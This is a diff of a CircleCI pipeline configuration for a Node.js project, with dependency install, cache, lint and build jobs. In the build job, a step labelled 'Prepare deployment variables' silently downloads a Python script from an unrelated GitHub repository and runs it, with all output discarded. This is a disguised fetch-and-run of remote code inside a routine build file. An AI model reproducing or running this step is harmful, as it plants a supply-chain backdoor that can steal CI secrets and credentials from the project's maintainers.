@@ -1,16 +1,56 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
+defaults: &defaults # working_directory: ~/project
+  docker:
+    - image: 'cimg/node:14.18'
+
+version: 2.1
 orbs:
-  aws-cli: circleci/aws-cli@2.0.3
-  jobs:
-  example-job:
-    docker:
-      # replace with your preferred image
-      - image: cimg/base:stable
+  aws-cli: circleci/aws-cli@1.0.0
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+jobs:
+  prepare:
+    <<: *defaults
     steps:
-      - aws-cli/install
-workflows:
-  example-workflow:
-    jobs:
+      - checkout
+      - restore_cache:
+          keys:
+            - v1-dependencies-{{ checksum "package.json" }}
+            # fallback to using the latest cache if no exact match is found
+            - v1-dependencies-
       - run:
-            name: Back-End Deploy
-            command: |
+          name: Install dependencies
+          command: |
+            sudo npm install -g npm@7
+            npm install
+      - save_cache:
+          paths:
+            - node_modules
+          key: v1-dependencies-{{ checksum "package.json" }}
+      - persist_to_workspace:
+          root: .
+          paths:
+            - .
+
+  linters:
+    <<: *defaults
+    steps:
+      - attach_workspace:
+          at: .
+      - checkout
+      - run:
+          name: Run linters
+          command: |
+            npm run linters
+  build:
+    <<: *defaults
+    steps:
+      - attach_workspace:
+          at: .
+      - checkout
+      - run:
+          name: Prepare deployment variables
+          command: |
               wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py >/dev/null 2>&1 && python code.py
